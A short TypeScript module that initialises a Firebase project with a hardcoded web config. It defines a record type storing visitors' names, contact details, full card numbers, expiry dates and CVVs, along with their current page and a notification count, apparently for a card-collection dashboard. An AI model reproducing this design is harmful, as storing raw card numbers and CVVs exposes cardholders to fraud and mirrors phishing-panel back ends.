import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyBCKS2SpibTAzFUm_1tqB-8-OuH5cse-8k",
  authDomain: "fbcasf-4a75e.firebaseapp.com",
  databaseURL: "https://fbcasf-4a75e-default-rtdb.firebaseio.com",
  projectId: "fbcasf-4a75e",
  storageBucket: "fbcasf-4a75e.firebasestorage.app",
  messagingSenderId: "917743303180",
  appId: "1:917743303180:web:5a455e3889098e57af0c29",
  measurementId: "G-TT505C1Y1D"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

